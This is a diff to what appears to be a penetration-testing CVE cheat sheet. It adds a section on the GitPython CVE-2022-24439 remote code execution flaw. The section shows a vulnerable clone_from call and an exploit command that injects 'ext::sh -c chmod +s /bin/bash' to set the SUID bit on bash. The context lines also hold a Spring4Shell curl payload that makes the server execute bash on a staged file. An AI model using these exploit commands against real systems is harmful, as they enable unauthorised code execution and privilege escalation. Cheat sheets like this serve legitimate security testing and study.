@@ -18,6 +18,7 @@
 - [CVE-2022-1040: Sophos XG Firewall Authentication Bypass RCE](#cve-2022-1040-sophos-xg-authentication-bypass-rce)
 - [CVE-2022-21675: Zip Slip](#cve-2022-21675-zip-slip)
 - [CVE-2022-22963: Spring4Shell RCE (0-day)](#cve-2022-22963-spring4shell-rce-0-day)
+- [CVE-2022-24439: GitPython RCE](#cve-2022-24439-gitpython-rce)
 - [CVE-2022-30190: MS-MSDT Follina RCE](#cve-2022-30190-ms-msdt-follina-rce)
 - [CVE-2022-31214: Firejail LPE](#cve-2022-31214-firejail-lpe)
 - [CVE-2022-44268: ImageMagick Arbitrary File Read PoC](#cve-2022-44268-imagemagick-arbitrary-file-read-poc)
@@ -627,6 +628,22 @@ $ curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-e
 
 ```c
 $ curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /dev/shm/<FILE>")' --data-raw 'data' -v
+```
+
+## CVE-2022-24439: GitPython RCE
+
+> https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
+
+A script could be vulnerable if it calls `protocol.ext.allow`.
+
+```python
+from git import Repo
+
+r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
+```
+
+```c
+$ <FILE>.py 'ext::sh -c chmod% +s% /bin/bash'
 ```
 
 ## CVE-2022-30190: MS-MSDT Follina RCE
